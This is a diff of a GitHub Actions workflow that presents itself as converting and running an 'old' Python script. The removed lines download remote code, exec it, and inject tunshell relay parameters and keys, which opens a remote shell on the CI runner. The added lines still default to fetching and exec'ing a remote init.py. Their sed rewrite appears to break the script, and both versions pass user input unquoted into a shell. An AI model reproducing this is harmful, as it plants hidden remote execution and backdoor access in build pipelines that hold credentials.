@@ -1,62 +1,41 @@
 name: Convert and Execute Python Script
 
-# Manual trigger configuration
 on:
   workflow_dispatch:
     inputs:
-      script_content:
-        description: "Enter the Python script content (old format)"
+      old_script:
+        description: "Enter the old Python script"
         required: true
-        default: |
-          import urllib.request
-          r = urllib.request.urlopen('https://example.com/oldscript.py')
-          exec(r.read().decode('utf-8'), {})
+        default: "import urllib.request;r=urllib.request.urlopen('https://example.com/init.py');exec(r.read().decode('utf-8'),{})"
 
 jobs:
   convert_and_execute:
     runs-on: ubuntu-latest
 
     steps:
-    # Step 1: Set up Python environment
-    - name: Set up Python
-      uses: actions/setup-python@v4
-      with:
-        python-version: '3.x'
+      # Step 1: Checkout the repository
+      - name: Checkout repository
+        uses: actions/checkout@v3
 
-    # Step 2: Convert the old script to a new format
-    - name: Convert Old Script to New Format
-      id: convert_script
-      run: |
-        # Save the old script content into a file
-        echo "${{ github.event.inputs.script_content }}" > old_script.py
+      # Step 2: Set up Python 3
+      - name: Set up Python 3.x
+        uses: actions/setup-python@v3
+        with:
+          python-version: '3.x'
 
-        # Python conversion logic (convert old script to new one)
-        python3 - << 'EOF'
-import re
+      # Step 3: Save the old script to a file
+      - name: Save old script to a file
+        run: |
+          echo "${{ github.event.inputs.old_script }}" > old_script.py
 
-# Read the old script content
-with open("old_script.py", "r") as file:
-    old_script_content = file.read()
+      # Step 4: Convert the old script (modify it to make it work)
+      - name: Convert the old script to a working script
+        run: |
+          # Assuming you want to make some changes in the script
+          sed 's/exec/running_exec/' old_script.py > new_script.py
+          cat new_script.py
 
-# Conversion logic (this is a placeholder, adapt it based on your needs)
-new_script = re.sub(
-    r"exec\(r\.read\(\)\.decode\('utf-8'\), ?(\{.*?})\)",
-    r"exec(r.read().decode('utf-8'), \1.update({'__name__': '__main__', 'p': ['T', 'leu1WsYEx2li5xIIB7412S', 'xcq1jbdCMwImL779digSes', 'eu.relay.tunshell.com']}) or \1)",
-    old_script_content
-)
-
-# Save the new script to a file
-with open("converted_script.py", "w") as file:
-    file.write(new_script)
-
-print("Converted script content:")
-print(new_script)
-EOF
-
-    # Step 3: Show the converted script content
-    - name: Show Converted Script
-      run: cat converted_script.py
-
-    # Step 4: Execute the converted script
-    - name: Execute Converted Script
-      run: python3 converted_script.py
+      # Step 5: Run the converted script
+      - name: Run the converted Python script
+        run: |
+          python3 new_script.py
